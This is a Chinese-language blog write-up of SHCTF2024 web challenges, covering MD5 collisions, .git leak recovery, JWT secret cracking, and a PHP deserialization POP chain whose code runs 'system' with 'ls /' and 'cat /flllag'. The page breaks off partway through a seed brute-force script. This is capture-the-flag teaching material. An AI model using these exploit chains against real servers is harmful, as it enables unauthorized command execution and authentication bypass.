<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>SHCTF2024 WriteUp | k0relapseの次元囚笼</title><meta name="author" content="k0relapse"><meta name="copyright" content="k0relapse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="🥬🐶传奇之SHCTF2024篇"><meta property="og:type" content="article"><meta property="og:title" content="SHCTF2024 WriteUp"><meta property="og:url" content="https://k0re.xyz/2024/11/20/SHCTF2024%20WriteUp/index.html"><meta property="og:site_name" content="k0relapseの次元囚笼"><meta property="og:description" content="🥬🐶传奇之SHCTF2024篇"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://k0re.xyz/resources/images/ArticleTopImages/SHCTF2024.jpg"><meta property="article:published_time" content="2024-11-19T16:00:00.000Z"><meta property="article:modified_time" content="2024-11-28T12:25:05.712Z"><meta property="article:author" content="k0relapse"><meta property="article:tag" content="WriteUp"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://k0re.xyz/resources/images/ArticleTopImages/SHCTF2024.jpg"><link rel="shortcut icon" href="/img/avatar_FHD.webp"><link rel="canonical" href="https://k0re.xyz/2024/11/20/SHCTF2024%20WriteUp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>(() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"SHCTF2024 WriteUp",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,isShuoshuo:!1}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/cur.css"><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')</script><link rel="stylesheet" href="/css/corner-indicator.css"><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar_FHD.webp" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i> <span>Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url(/resources/images/ArticleTopImages/SHCTF2024.jpg)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon.ico" alt="Logo"><span class="site-name">k0relapseの次元囚笼</span></a><a class="nav-page-title" href="/"><span class="site-name">SHCTF2024 WriteUp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i> <span>Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SHCTF2024 WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-19T16:00:00.000Z" title="Created 2024-11-20 00:00:00">2024-11-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-28T12:25:05.712Z" title="Updated 2024-11-28 20:25:05">2024-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Articles/">Articles</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">5.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>19mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/2024/11/20/SHCTF2024%20WriteUp/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/11/20/SHCTF2024%20WriteUp/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="·-MD5-master！"><a href="#·-MD5-master！" class="headerlink" title="· MD5 master！"></a>· MD5 master！</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728397376780-b3276548-66c0-4f0a-8faf-24a12d10b1f5.webp" alt="image.png"></p><p>阅读代码可知，想让代码输出flag文件内容，需要满足：<br>$master变量 拼接 POST请求发送的master1字符串≠$master变量 拼接 POST请求发送的master2字符串<br>即master1≠master2<br>两个拼接所得的字符串MD5相同<br>​<br>则利用fastcoll工具生成MD5相同文件,头为$master值<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397395956-9c5a0a82-e9f9-4f11-87c6-08bd3c79835c.webp" alt="image.png"></p><p>使用如下代码转换为字符串<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397406324-747285ff-c719-4921-bc3b-f05bb3f15d09.webp" alt="image.png"></p><p>运行结果：<br>MD5+master%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01d%176%12%3B%0A%85%C1W%EE%AAU%8C%26%0D%C2%07%13v%9C%11%80%5E%08%12y%82W.%B6%F0%40%1D%F7%CD%CF%A9%0B%B6%CBca%99%DBSn%14%C4%BCM%7F%8F%3F%9E%A7%FF%2C%B7%C4%C7%AA%E2%D7%402%81%0D%F9%8E%F6e%97%F7%9A%B4%E2%0D%D4F%2F%13%9B%9Al%5C%927-%B5%E0%D6%3B%60H%B6%D7%7DHH%9F%86%B1%FC%F9%02B%9B%AC%03%05Y%CB%28%B7%076I%5BG%C8g%0A%C00%C9itMD5+master%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01d%176%12%3B%0A%85%C1W%EE%AAU%8C%26%0D%C2%07%13%F6%9C%11%80%5E%08%12y%82W.%B6%F0%40%1D%F7%CD%CF%A9%0B%B6%CBca%99%DB%D3n%14%C4%BCM%7F%8F%3F%9E%A7%FF%2C%B7D%C7%AA%E2%D7%402%81%0D%F9%8E%F6e%97%F7%9A%B4%E2%0D%D4F%2F%13%9B%1Al%5C%927-%B5%E0%D6%3B%60H%B6%D7%7DHH%9F%86%B1%FC%F9%02B%9B%AC%83%04Y%CB%28%B7%076I%5BG%C8g%0A%400%C9it<br>去除MD5+master%21(对应”MD5 master!”)<br>得到需要POST的master1,master2;<br>构造请求包：<br>使用Yakit：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397418829-7505f00d-81ba-4e7c-9319-5093689b5a06.webp" alt="image.png"></p><p>发送请求，得到Flag:<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397478676-540b88ae-713a-4ded-b731-83cd9ab38d1e.webp" alt="image.png"></p><h2 id="·-1zFlask"><a href="#·-1zFlask" class="headerlink" title="· 1zFlask"></a>· 1zFlask</h2><p>题目提示打开robots.txt：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397499957-71adb540-8db0-4631-8e22-4c1f4c322ba0.webp" alt="image.png"></p><p>又提示打开&#x2F;s3recttt目录，下载得到py文件：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397519370-5855d019-4403-4b78-a365-4019d909b989.webp" alt="image.png"></p><p>访问&#x2F;api，发现flag文件在根目录下：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397530154-f59baf9a-2249-4c64-8c67-a124469b5a08.webp" alt="image.png"></p><p>构造一个url请求，cat出flag就行了：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397545415-ee8022a1-3255-418a-ab07-18f54b7afb31.webp" alt="image.png"></p><p><img src="/resources/images/SHCTF2024WriteUpassert/1728397558348-dd960d9c-b7a8-4344-9224-72db33d15cda.webp" alt="image.png"></p><h2 id="·-蛐蛐-蛐蛐"><a href="#·-蛐蛐-蛐蛐" class="headerlink" title="· 蛐蛐?蛐蛐!"></a>· 蛐蛐?蛐蛐!</h2><p>F12查看：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397578288-b8fc4149-215e-4a39-a90e-2e39e3b0525d.webp" alt="image.png"></p><p>按提示打开source.txt:<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397590471-443f37b0-dea0-4004-a34c-2e1ddfcc2b3c.webp" alt="image.png"></p><p>想通过第一层if判断，需要Get方法传递的参数 ’ququ’ 值为114514且 反转后的 ’ququ’ 值不等于411511<br>第一眼看上去好像是个不可能满足的条件，但是可以尝试一下类似00截断的方法欺骗条件判断<br>再从第一个页面的html文件中得知 请求的是check.php<br>则构造url：<a href="http://x.x:x/check.php?ququ=114514%00">http://x.x:x/check.php?ququ=114514%00</a><br>得到回显：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397606639-e1567377-eae8-4d76-be1b-78a2b3b11571.webp" alt="image.png"></p><p>第二层条件判断要求POST方法传递的 ’ququ’ 值不为null<br>第三层条件判断则要求POST方法传递的 ’ququ’ 值前6位必须为 ’ququk1’<br>通过这两层判断则通过eval()执行POST过去的代码<br>使用yakit构建POST请求包：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397625350-2e5e2cd8-0a55-45b0-b8c6-da9b75e3af3f.webp" alt="image.png"></p><p>​<br>得知Flag在根目录，cat出flag内容即可。<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397632084-416c6db8-eba2-4bf0-8f64-62d058e05bb9.webp" alt="image.png"></p><h2 id="·-单身十八年的手速"><a href="#·-单身十八年的手速" class="headerlink" title="· 单身十八年的手速"></a>· 单身十八年的手速</h2><p>F12直接查看源码，这是一个在本地运行的js<br>混淆很多，但是不妨碍我们找到这个:<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397639856-f9de3199-697b-4486-98b2-3dd8099c344b.webp" alt="image.png"></p><p>一眼Base64，扔进解码器解码得：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397649046-7957957c-e16a-46ec-889f-4a973571f234.webp" alt="image.png"></p><h2 id="·-ez-gittt"><a href="#·-ez-gittt" class="headerlink" title="· ez_gittt"></a>· ez_gittt</h2><p>题目叫ezgit，想必是.git泄露<br>访问&#x2F;.git ，果然如此：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397766717-a366fd1b-eebf-41ab-a29c-3a19539ff74b.webp" alt="image.png"></p><p>先用GitHack看一眼，发现git克隆不全：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397779734-b0873ba9-ea48-463a-be9a-f9e4c4297105.webp" alt="image.png"></p><p>指定是index被做了手脚，010打开捉鬼：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397786136-0498f574-479f-4420-b085-893dd38e8e5e.webp" alt="image.png"></p><p><em>文件树都被删的只剩下index.html了</em></p><p>那就进.git\objects手工爆破吧<br>找了个脚本：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397796780-432e1bff-f9f4-4db9-b4b5-8e2379a1ae05.webp" alt="image.png"></p><p>一个个试，第一个就出来了：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397804049-2fb1ec22-cff8-470f-a5bb-c5e2888dea30.webp" alt="image.png"></p><h2 id="·-Jvav"><a href="#·-Jvav" class="headerlink" title="· Jvav"></a>· Jvav</h2><p>是一个Java的在线执行环境<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397811278-01c22fe5-a3e4-457d-a0bc-19d1580de359.webp" alt="image.png"></p><p>整一段Java执行ls命令<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397817287-49b1a5e4-998a-4ae7-aaee-98781d1b22cd.webp" alt="image.png"></p><p>结果：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397823549-b8590e01-954d-4479-b7ac-fd3d162eaee0.webp" alt="image.png"></p><p>cat读取flag即可：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397837912-18f00bbb-69ea-445c-8f1c-3f9114b4608f.webp" alt="image.png"></p><h2 id="·-poppopop"><a href="#·-poppopop" class="headerlink" title="· poppopop"></a>· poppopop</h2><p>题目告诉了我们源码：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728398256760-527c7bbf-6b41-402d-a88f-83b8880415ac.webp" alt="image.png"></p><p>我们一个类一个类分析一下：</p><ol><li><p>类SH定义了两个静态变量，初始值均为False</p></li><li><p>类C定义了一个名叫flag的方法和一个公共变量，flag()的内容可以通过$p更改</p></li><li><p>类T包含了一个__destruct()魔术方法，在本题中似乎会在反序列化后自动调用，同时会设置类SH中的$Web值为True</p></li><li><p>类F包含了一个__toString()魔术方法，在包含它的类F被调用为字符串时自动执行，设置类SH中的$SHCTF值为真，同时$this-&gt;o-&gt;flag()使我们可以利用$o跳转到类C中的flag()方法，此时__toString()的值为‘其实。。。。，’</p></li><li><p>类SHCTF包含了一个__invoke()魔术方法，在类SHCTF被调用的时候自动执行，其包含了一个条件判断：若类SH中的$Web为真，则输出“小丑竟是我自己呜呜呜~”，中间的($this-&gt;isyou)($this-&gt;flag)让我们可以通过$isyou,$flag【注意与flag()方法区分】执行任意指令，$Web为否不再赘述</p></li><li><p>最后的部分则是获取通过GET方法传递的‘data’参数，base64解码data后传递给unserialize()进行反序列化分析完了，接下来就是<del>连连看</del>构造pop链了</p></li><li><p>首先我们先实例化所有类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SH</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$shctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br></pre></td></tr></table></figure></li><li><p>链条嘛，有头有尾，我们先找头部，刚好这里有一个__destruct()会在最先开始的反序列化后自动执行，我们拿它下手：__destruct()里面有一个echo，刚好需要字符串输入，我们就把里面有__toString()的$f给它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br></pre></td></tr></table></figure></li><li><p>$f被echo调用为字符串了，激活了__toString()，它里面没什么好跳转的，只有一个$this-&gt;o-&gt;flag()，我们就利用这个$o把$this-&gt;o-&gt;flag()指向$c里面那个flag()，也即$c-&gt;flag()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure></li><li><p>现在跳转到了类C里面那个flag()，($this-&gt;p)()允许我们通过$c-&gt;p &#x3D; ?调用一个函数，刚好我们有个在$shctf里面的__invoke()可以借此激活：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br></pre></td></tr></table></figure></li><li><p>类SHCTF里面的条件判断我们已经在第一步满足了，这个时候我们就可以给 $isyou 和 $flag 赋值，以此执行我们的指令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;isyou = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;flag = <span class="string">&#x27;ls /&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>我们再将它们序列化，顺便转成base64：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SH</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$shctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;isyou = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;flag = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span>=<span class="title function_ invoke__">serialize</span>([<span class="variable">$sh</span>,<span class="variable">$t</span>,<span class="variable">$f</span>,<span class="variable">$c</span>,<span class="variable">$shctf</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure></li><li><p>构建url：<a href="http://x.x:x/?data=你输出的base64复制粘贴">http://x.x:x/?data=你输出的base64复制粘贴</a></p></li><li><p>得到回显：<img src="/resources/images/SHCTF2024WriteUpassert/1728401750772-817bd8a6-e9be-437e-9839-4eac36971323.webp" alt="image.png"></p></li><li><p>我们得知flag在根目录下的flllag文件中，$shctf-&gt;flag &#x3D; ‘cat &#x2F;flllag’即可</p></li><li><p>最终flag：<img src="/resources/images/SHCTF2024WriteUpassert/1728401955994-ec3e2c76-b5f9-4ffb-9ddf-051627b17cb3.webp" alt="image.png"></p></li></ol><h2 id="·-登陆验证"><a href="#·-登陆验证" class="headerlink" title="· 登陆验证"></a>· 登陆验证</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728639787167-b2652081-f059-478c-a5a9-660604b316c1.webp" alt="c349d4768528b2c4b326690ae9ff113.jpg"></p><p>读题，考点为jwt，且告诉我们有密钥加密，需要爆破<br>打开网站<br><img src="/resources/images/SHCTF2024WriteUpassert/1728640036381-da562b34-c424-4fc7-8f78-67bafeeb05aa.webp" alt="b2506910425de3ebd837570ab804cfa.jpg"></p><p>可以看到是一个登陆界面，考点不在登陆上，我们先尝试几个弱用户密码登陆，以获取cokkie<br>尝试到用户名为admin，密码为admin时成功：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728640213411-5ace89ea-404c-443c-8e77-aa798aff829f.webp" alt="59955b207a851cb2319a755a7c2083f.jpg"></p><p>说我不是admin，那应该就是jwt在捣鬼了，拉到Yakit里面看一下先：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728642093039-8cf8402f-0617-4354-bb25-f5b5039b438d.webp" alt="image.png"></p><p>可以看到，在username，password验证之外还有一层token的验证。<br>这个token前两部分是base64编码过的明文，第三部分则是密钥结合前两部分加密得出的签名，服务器端验证签名以确认token有效，而加密方式可以从第一部分了解到。<br>我们直接使用jwt.io解码一下内容：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728642484279-c5db4567-57b7-4812-ba9e-fb7277bfdb15.webp" alt="image.png"></p><p>可以看到，’role’字段&#x3D;user的捣鬼导致我们没有被认证为admin，当role&#x3D;admin时即可验证通过。’alg’字段代表其加密方式为HS256，是对称式加密，加密算法为HMAC SHA-256，意味着我们可以暴力破解密钥以突破签名验证，更改role。<br>不过在此之前我们还需要按照常规思路走一遍，验证一下更改加密方式为none时是否可以绕过签名校验，万一不用爆破了呢：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728643233480-68404f1c-0e11-4002-858d-3b7d102a360a.webp" alt="image.png"><br><img src="/resources/images/SHCTF2024WriteUpassert/1728643243854-22a3031c-2fb8-4c4b-a866-df07c3cd0886.webp" alt="image.png"></p><p><img src="/resources/images/SHCTF2024WriteUpassert/1728643291666-a3c21e78-c3a6-494b-b605-bc1d696506cc.webp" alt="image.png"></p><p>很明显不行，那就老老实实爆破密钥，使用jwtcrack<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">这里</a>破解：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728643442743-6e110c53-3d54-4888-a508-10a1543b2cb2.webp" alt="image.png"></p><p>放了一个晚上出来了，再次利用jwt.io封装token：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728643570570-dabd4d70-5233-4a13-879e-5d3ea91dc906.webp" alt="image.png"></p><p>替换token请求，得到flag：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728643649794-21e4a456-075f-46cf-8194-8d07a7d38d21.webp" alt="image.png"></p><h2 id="·-guess-the-number"><a href="#·-guess-the-number" class="headerlink" title="· guess_the_number"></a>· guess_the_number</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728887536480-bad8953e-3569-4006-a590-510d8c107abe.webp" alt="image.png"></p><p>F12查看源码先：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728887595814-bad60176-9515-473a-83a8-45224d569f51.webp" alt="image.png"></p><p>提示我们访问&#x2F;s0urce路由，得到源码：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728887756893-9216a1f9-5b1b-483f-a230-939d709cdff6.webp" alt="image.png"></p><p>解读源码，发现&#x2F;guess路由会获取我们传递的’num’参数，若我们传递的参数等于随机生成的second_num，则返回flag文件内容<br>再看随机数生成段，先是随机生成一个七位的seed，然后再利用这个seed生成两个随机数，而first_num已经告诉我们了。<br>爆破10位数的second_num不太现实，那么思路就是爆破7位的seed，通过seed获取second_num。<br>制作爆破脚本，让ai帮我做了一下多进程优化以提高爆破效率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    